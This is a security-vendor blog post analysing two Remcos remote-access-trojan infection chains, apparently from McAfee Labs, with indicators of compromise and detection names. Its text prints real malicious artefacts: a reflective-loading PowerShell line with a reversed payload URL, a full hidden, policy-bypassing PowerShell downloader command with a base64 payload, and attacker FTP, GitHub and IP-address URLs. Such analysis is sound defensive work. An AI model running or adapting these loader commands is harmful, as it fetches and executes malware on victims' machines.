---
title: "The Stealthy Stalker: Remcos RAT"
date: 2025-01-03
categories: 
  - "security"
---

![](https://www.mcafee.com/blogs/wp-content/uploads/2020/09/300x200_Blog_031324.png)

_Authored By Sakshi Jaiswal, Anuradha M_

In Q3 2024, McAfee Labs identified a sharp rise in the Remcos RAT threat. It has emerged as a significant threat in the world of cybersecurity, gaining traction with its ability to infiltrate systems and compromise sensitive data. This malware, often delivered through phishing emails and malicious attachments, allows cybercriminals to remotely control infected machines, making it a powerful tool for espionage, data theft, and system manipulation. As cyberattacks become more sophisticated, understanding the mechanisms behind RemcosRAT and adopting effective security measures are crucial to protecting your systems from this growing threat. This blog presents a technical analysis of two RemcosRAT variants

**_The heat map below illustrates the prevalence of Remcos in the field in Q3,2024_**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure1.png)

<figure>

<figcaption>

Figure 1: Remcos heat map

</figcaption>

</figure>

### **Variant 1:**

In the first variant of Remcos, executing a VBS file triggers a highly obfuscated PowerShell script that downloads multiple files from a command-and-control (C2) server. These files are then executed, ultimately leading to their injection into RegAsm.exe, a legitimate Microsoft .NET executable.

**Infection Chain**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure2.png)

<figure>

<figcaption>

Figure 2: Infection Chain of variant 1

</figcaption>

</figure>

### **Analysis:**

Executing the VBS file initially triggers a Long-Obfuscated PowerShell command.

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure41.png)

<figure>

<figcaption>

Figure 3: Obfuscated PowerShell command 

</figcaption>

</figure>

It uses multi-layer obfuscation, and after de-obfuscation, below is the final readable content.

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure4.png)

<figure>

<figcaption>

Figure 4: De-Obfuscated code

</figcaption>

</figure>

The de-obfuscated PowerShell script performs the following actions:

1. Firstly, the script checks if the PowerShell version is 2.0. then the file will be downloaded from Googledrive “’https://drive.google.com/uc?export=download&id=‘“ in Temp location. and if PowerShell version is not 2.0 then it downloads string from ftp server.
2. It creates a copy of itself in the startup location – **AppDataRoamingMicrosoftWindowsStart MenuProgramsStartup**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure5.png)

<figure>

<figcaption>

Figure 5: Self-copy location 

</figcaption>

</figure>

3. In this case, since the PowerShell version is not 2.0, it will download strings from the FTP server.
4. Uses FTP to download DLL01.txt file, from “ftp://desckvbrat1@ftp.desckvbrat.com.br/Upcrypter/01/DLL01.txt” with the username:desckvbrat1 and password: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*as mentioned in the PowerShell script. Using FileZilla with the provided username and password to download files.

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure6.png)

<figure>

<figcaption>

Figure 6: Download file from FTP server 

</figcaption>

</figure>

5. It has 3 files DLL01.txt, Entry.txt and Rumpe.txt, which contains a URL that provides direct access to a snippet hosted on the PasteCode.io platform.

**DLL01.txt File**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure7.png)

<figure>

<figcaption>

Figure 7: DLL01.txt content 

</figcaption>

</figure>

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure8.png)

<figure>

<figcaption>

Figure 8: Snippet which is hosted on PasteCode.io of DLL01.txt

  
The snippet above is encoded, after decoding it, we are left with the ClassLibrary3.dll file.

</figcaption>

</figure>

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure9.png)

<figure>

<figcaption>

Figure 9: ClassLibrary3.dll

</figcaption>

</figure>

**Rumpe.txt String**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure10.png)

<figure>

<figcaption>

Figure 10: Rumpe.txt content 

</figcaption>

</figure>

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure11.png)

Figure 11: Snippet which is hosted on PasteCode.io of Rumpe.txt

The snippet above is encoded, Decoding it generates ClassLibrary1.dll file.

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure12.png)

<figure>

<figcaption>

Figure 12: ClassLibrary1.dll

</figcaption>

</figure>

**Entry.txt**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure13.png)

<figure>

<figcaption>

Figure 13: Entry.txt content

</figcaption>

</figure>

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure14.png)

<figure>

<figcaption>

Figure 14: Snippet which is hosted on PasteCode.io of Entry.txt

</figcaption>

</figure>

1. Last line of long PowerShell script – \[System.AppDomain\]::CurrentDomain.Load( $acBcZ ).GetType(‘ClassLibrary3.Class1’).GetMethod( ‘prFVI’ ).Invoke( $null , \[object\[\]\] ( ‘txt.sz/moc.gnitekrame-uotenok//:sptth‘ , $hzwje , ‘true’ ) ); This line loads a .NET assembly into the current application domain and invokes it.
2. “txt.sz/moc.gnitekrame-uotenok//:sptth” The string is a reversed URL. When reversed, it becomes: https://koneotemarket.com/zst.txt. The raw data hosted in that location is base64 encoded and stored in reversed order. Once decoded and reversed, the content is invoked for execution.

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure15.png)

<figure>

<figcaption>

Figure 15: Base64 encoded Content

</figcaption>

 

</figure>

1. After invocation, it creates a directory in **AppData/Local/Microsoft**, specifically within the **LocalLow** folder. It then creates another folder named **“System Update”** and places three files inside it.

The **LocalLow** folder is a directory in Windows used to store application data that requires low user permissions. It is located within the AppData folder. The two paths below show how the malware is using a very similar path to this legitimate windows path.

legitimate Path: C:Users<YourUsername>AppDataLocalLow

Mislead Path: C:Users<YourUsername>AppDataLocal**MicrosoftLocalLow**

In this case, a **LocalLow** folder has been created inside the Microsoft directory to mislead users into believing it is a legitimate path for **LocalLow**.

A screenshot of the files dropped into the **System Update folder** within the misleading LocalLow directory highlights the tactic used to mimic legitimate Windows directories, intending to evade user suspicion.

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure16.png)

<figure>

<figcaption>

Figure 16: Screenshot of dropped files into System Update directory

</figcaption>

</figure>

Content of x3.txt

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure17.png)

<figure>

<figcaption>

Figure 17: x3.txt content 

</figcaption>

</figure>

Then x2.ps1 is executed. Content of x2.ps1  
![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure18.png)

<figure>

<figcaption>

Figure 18: x2.ps1 content 

</figcaption>

</figure>

The command adds a new registry entry in the Run key of the Windows Registry under HKCU (HKEY\_CURRENT\_USER). This entry ensures that a PowerShell script (yrnwr.ps1) located in the System Update folder inside the misleading LocalLow directory is executed at every user login.

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure19.png)

<figure>

<figcaption>

Figure 19: HKCU Run Registry entry for persistence 

</figcaption>

</figure>

After adding registry entry, it executes yrnwr.ps1 file. Content of yrnwr.ps1 which is obfuscated.

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure20.png)

<figure>

<figcaption>

Figure 20: Obfuscated PowerShell content

</figcaption>

</figure>

After Decoding yrnwr.ps1

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure21.png)

<figure>

<figcaption>

Figure 21: De-obfuscated PowerShell content 

</figcaption>

</figure>

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure22.png)

<figure>

<figcaption>

Figure 22: Last line of script 

</figcaption>

</figure>

It utilizes a process injection technique to inject the final Remcos payload into the memory of RegAsm.exe, a legitimate Microsoft .NET executable.

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure23.png)

<figure>

<figcaption>

Figure 23: Process Tree 

</figcaption>

</figure>

Memory String of RegAsm.exe which shows the traces of Remcos

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure24.png)

<figure>

<figcaption>

Figure 24: Keylogger related Strings in memory dump

</figcaption>

</figure>

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure25.png)

<figure>

<figcaption>

Figure 25: Remcos related String in memory dump

</figcaption>

</figure>

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure26.png)

<figure>

<figcaption>

Figure 26: Remcos Mutex creation String in memory dump 

</figcaption>

</figure>

**Mutex Created**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure27.png)

<figure>

<figcaption>

Figure 27: Mutex creation

</figcaption>

</figure>

A log file is stored in the %ProgramData% directory, where a folder named “1210” is created. Inside this folder, a file called logs.dat is generated to capture and store all system logging activities.

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure28.png)

<figure>

<figcaption>

Figure 28: Logs.dat file to capture all keystroke activity. 

</figcaption>

</figure>

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure29.png)

<figure>

<figcaption>

Figure 29: Strings in payload

</figcaption>

</figure>

Finally, it deletes the original VBS sample from the system.

### **Variant 2 – Remcos from Office Open XML Document:**

This variant of Remcos comes from Office Open XML Document. The docx file comes from a spam email as an attachment.

**Infection Chain:**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure30.png)

<figure>

<figcaption>

Figure 30: Infection Chain of variant 2

</figcaption>

</figure>

**Email Spam:**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure31.png)

<figure>

<figcaption>

Figure 31: Spam Email

</figcaption>

</figure>

The email displayed in the above image contains an attachment in the form of a .docx file, which is an Office Open XML document.

### **Analysis:**

From the static analysis of .docx file, it is found that the malicious content was present in the relationship file “setting.xml.rels”. **Below is the content of settings.xml.rels file:**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure32.png)

<figure>

<figcaption>

Figure 32: rels file content

</figcaption>

</figure>

From the above content,it is evident that it downloads a file from an external resource which points to a URL hxxps://dealc.me/NLizza.

The downloaded file is an RTF document named **“seethenewthingswhichgivenmebackwithentirethingstobegetbackonlinewithentirethingsbackwithentirethinsgwhichgivenmenewthingsback\_\_\_\_\_\_\_greatthingstobe.doc”**which has an unusually long filename.

The RTF file is crafted to include CVE-2017-11882 Equation Editor vulnerability which is a remote code execution vulnerability that allows an attacker to execute arbitrary code on a victim’s machine by embedding malicious objects in documents.

Upon execution, the RTF file downloads a VBS script from the URL **“hxxp://91.134.96.177/70/picturewithmegetbacktouse.tIF”** to the %appdata% directory, saving it as **“picturewithmegetbacktouse.vbs”.**

**Below is the content of VBS file:**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure33.png)

<figure>

<figcaption>

Figure 33: VBS Obfuscated content 

</figcaption>

</figure>

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure34.png)

<figure>

<figcaption>

Figure 34: VBS Obfuscated content 

</figcaption>

</figure>

The VBScript is highly obfuscated, employing multiple layers of string concatenation to construct a command. It then executes that command using WScript.Shell.3ad868c612a6

**Below is the de-obfuscated code:**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure35.png)

<figure>

<figcaption>

Figure 35: De-Obfuscated Content 

</figcaption>

</figure>

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure36.png)

<figure>

<figcaption>

Figure 36: De-Obfuscated Content

</figcaption>

</figure>

The above code shows that the VBS file launches PowerShell using Base64 encoded strings as the command.

**Below is the 1st PowerShell command line:**

“C:WindowsSystem32WindowsPowerShellv1.0powershell.exe” -command $Codigo = ‘LiAoIChbc3RyaW5HXSR2ZXJCT1NFUFJFZmVSRU5jRSlbMSwzXSsneCctam9JTicnKSgoKCd7MH11cmwgJysnPSB7Mn1odHRwczovLycrJ3JhJysndy4nKydnaScrJ3QnKydodScrJ2J1Jysnc2VyJysnY29uJysndGVuJysndCcrJy5jb20vTm8nKydEJysnZScrJ3QnKydlYycrJ3RPbi9Ob0RldCcrJ2VjdCcrJ09uL3JlZicrJ3MnKycvJysnaGVhZHMvbWFpbi9EZXRhaCcrJ05vJysndCcrJ2gnKyctVicrJy50eHR7MicrJ307JysnIHswfWJhJysnc2UnKyc2JysnNEMnKydvbnQnKydlJysnbicrJ3QgPSAnKycoTmV3JysnLU9iaicrJ2UnKydjJysndCBTeXMnKyd0ZW0uTmUnKyd0LicrJ1dlYicrJ0MnKydsaWVudCkuRCcrJ28nKyd3bmwnKydvYScrJ2RTdHInKydpbicrJ2coJysneycrJzB9dScrJ3JsKTsgeycrJzAnKyd9JysnYmluYXJ5QycrJ29udGUnKyduJysndCA9JysnICcrJ1tTJysneXN0JysnZW0uQ28nKydudmUnKydydCcrJ10nKyc6OkYnKydyb21CYXNlNjRTdHJpbicrJ2coezB9YmFzZScrJzYnKyc0QycrJ29udGUnKydudCcrJyknKyc7IHsnKycwfScrJ2FzcycrJ2UnKydtYmx5JysnID0nKycgWycrJ1JlZmxlY3QnKydpb24uQXNzZW1ibCcrJ3ldJysnOjpMJysnbycrJ2FkKHswfWJpbicrJ2FyeUMnKydvbicrJ3QnKydlbnQpOyBbZG5saScrJ2IuSU8uSG9tJysnZScrJ106OlZBSSh7JysnMX0nKyd0JysneCcrJ3QuJysnQ1ZGR0dSLzA3Lzc3JysnMS42OS4nKyc0MycrJzEuMScrJzkvLycrJzpwJysndHRoezEnKyd9LCB7JysnMScrJ30nKydkZXNhdGl2YWRvezEnKyd9LCB7MX1kZXMnKydhdGknKyd2YWQnKydvezF9LCB7MX1kZXMnKydhdCcrJ2knKyd2YWRvezF9LCcrJyB7MScrJ31SZScrJ2dBJysncycrJ217JysnMX0sJysnIHsnKycxfXsnKycxfSwnKyd7MX17MX0pJyktZiAgW2NIYVJdMzYsW2NIYVJdMzQsW2NIYVJdMzkpICk=’;$OWjuxd = \[system.Text.encoding\]::UTF8.GetString(\[system.Convert\]::Frombase64String($codigo));powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -command $OWjuxD

**Base64 decoded content:**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure37.png)

<figure>

<figcaption>

Figure 37: Base64 decoded content

</figcaption>

</figure>

The above base64 decoded content is used as input to the 2nd PowerShell command.

**Below is the 2nd PowerShell command line:**

“C:WindowsSystem32WindowsPowerShellv1.0powershell.exe” -windowstyle hidden -executionpolicy bypass -NoProfile -command “. ( (\[strinG\]$verBOSEPREfeRENcE)\[1,3\]+’x’-joIN”)(((‘{0}url ‘+’= {2}https://’+’ra’+’w.’+’gi’+’t’+’hu’+’bu’+’ser’+’con’+’ten’+’t’+’.com/No’+’D’+’e’+’t’+’ec’+’tOn/NoDet’+’ect’+’On/ref’+’s’+’/’+’heads/main/Detah’+’No’+’t’+’h’+’-V’+’.txt{2’+’};’+’ {0}ba’+’se’+’6’+’4C’+’ont’+’e’+’n’+’t = ‘+'(New’+’-Obj’+’e’+’c’+’t Sys’+’tem.Ne‘+’t.’+’Web’+’C’+’lient).D’+’o’+’wnl’+’oa’+’dStr’+’in’+’g(‘+'{‘+’0}u’+’rl); {‘+’0’+’}’+’binaryC’+’onte’+’n’+’t =’+’ ‘+'\[S’+’yst’+’2024 – New ‘+’nve’+’rt’+’\]’+’::F’+’romBase64Strin’+’g({0}base’+’6’+’4C’+’onte’+’nt’+’)’+’; {‘+’0}’+’ass’+’e’+’mbly’+’ =’+’ \[‘+’Reflect’+’ion.Assembl’+’y\]’+’::L’+’o’+’ad({0}bin’+’aryC’+’on’+’t’+’ent); \[dnli’+’b.IO.Hom’+’e’+’\]::VAI({‘+’1}’+’t’+’x’+’t.’+’CVFGGR/07/77’+’1.69.’+’43’+’1.1’+’9//’+’:p’+’tth{1’+’}, {‘+’1’+’}’+’desativado{1’+’}, {1}des’+’ati’+’vad’+’o{1}, {1}des’+’at’+’i’+’vado{1},’+’ {1’+’}Re’+’gA’+’s’+’m{‘+’1},’+’ {‘+’1}{‘+’1},’+'{1}{1})’)-f \[cHaR\]36,\[cHaR\]34,\[cHaR\]39) )”

- The PowerShell script uses string obfuscation by combining parts of strings using join and concatenation. This hides the actual URL being fetched.
- It constructs a URL that points to a raw GitHub file: hxxps://raw.githubusercontent.com/NoDetectOn/NoDetectOn/refs/heads/main/DetahNoth-V.txt

**Below is the content of “DetahNoth-V.txt”:**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure38.png)

<figure>

<figcaption>

Figure 38: Base64 encoded binary content 

</figcaption>

</figure>

Below is the code snippet to decode the above Base64 string into binary format and load it into memory as a .NET assembly. This method avoids writing files to disk, which makes it harder for some security products to detect the operation.

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure39.png)

<figure>

<figcaption>

Figure 39: Code snippet to decode Base64 string 

</figcaption>

</figure>

The decoded binary content leads to a DLL file named as “dnlib.dll”.

**Below is the last part of code in the 2nd PowerShell command line:**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure40.png)

<figure>

<figcaption>

Figure 40: Strings in PowerShell command

</figcaption>

</figure>

Once the assembly “dnlib.dll” is loaded, it calls a method VAI from a type dnlib.IO.Home within the loaded assembly. This method is invoked with several arguments:

- **txt.CVFGGR/07/771.69.431.19//:ptth:** This is a reversed URL (hxxp://91.134.96.177/70/RGGFVC.txt) that might point to another resource.
- **desativado (translated from Portuguese as “deactivated”):** Passed multiple times as arguments. This is used as a parameter for deactivating certain functions.
- **RegAsm:** This is the name of the .NET assembly registration tool, potentially indicating that the script is registering or working with assemblies on the machine.

**Below is the content of URL -hxxp://91.134.96.177/70/RGGFVC.txt:**

![](https://www.mcafee.com/blogs/wp-content/uploads/2024/12/Figure41.png)

<figure>

<figcaption>

Figure 41: Base64-encoded binary payload

</figcaption>

</figure>

The content shown above is a reversed, Base64-encoded binary payload, which, when decoded, results in the Remcos EXE payload.

### **Indicators of Compromise (IOCs)**

Variant 1

| **File Type** | **SHA256** |
| --- | --- |
| Vbs | d81847976ea210269bf3c98c5b32d40ed9daf78dbb1a9ce638ac472e501647d2 |

Variant 2

| **File Type** | **SHA256** |
| --- | --- |
| Eml | 085ac8fa89b6a5ac1ce385c28d8311c6d58dd8545c3b160d797e3ad868c612a6 |
| Docx | 69ff7b755574add8b8bb3532b98b193382a5b7cbf2bf219b276cb0b51378c74f |
| Rtf | c86ada471253895e32a771e3954f40d1e98c5fbee4ce702fc1a81e795063170a |
| Vbs | c09e37db3fccb31fc2f94e93fa3fe8d5d9947dbe330b0578ae357e88e042e9e5 |
| dnlib.dll | 12ec76ef2298ac0d535cdb8b61a024446807da02c90c0eebcde86b3f9a04445a |
| Remcos EXE | 997371c951144335618b3c5f4608afebf7688a58b6a95cdc71f237f2a7cc56a2 |

**  
URLs**

| hxxps://dealc.me/NLizza |
| --- |
| hxxp://91.134.96.177/70/picturewithmegetbacktouse.tIF |
| hxxps://raw.githubusercontent.com/NoDetectOn/NoDetectOn/refs/heads/main/DetahNoth-V.txt |
| hxxp://91.134.96.177/70/RGGFVC.txt |

**  
Detections:**

Variant 1

| **FileType** | **Detection** |
| --- | --- |
| VBS | Trojan:Script/Remcos.JD |

Variant 2

| **FileType** | **Detection** |
| --- | --- |
| Docx | Trojan:Office/CVE20170199.D |
| RTF | Trojan:Office/CVE201711882.A |
| VBS | Trojan: Script/Remcos.AM |
| Powershell | Trojan: Script/Remcos.PS1 |
| EXE | Trojan:Win/Genericy.AGP |

### **Conclusion**

In conclusion, the rise of Remcos RAT highlights the evolving nature of cyber threats and the increasing sophistication of malware. As this remote access Trojan continues to target consumers through phishing emails and malicious attachments, the need for proactive cybersecurity measures has never been more critical. By understanding the tactics used by cybercriminals behind Remcos RAT and implementing robust defenses such as regular software updates, email filtering, and network monitoring, organizations can better protect their systems and sensitive data. Staying vigilant and informed about emerging threats like Remcos RAT is essential in safeguarding against future cyberattacks.

### **References**

https://www.mcafee.com/blogs/other-blogs/mcafee-labs/from-email-to-rat-deciphering-a-vb-script-driven-campaign/

The post The Stealthy Stalker: Remcos RAT appeared first on McAfee Blog.
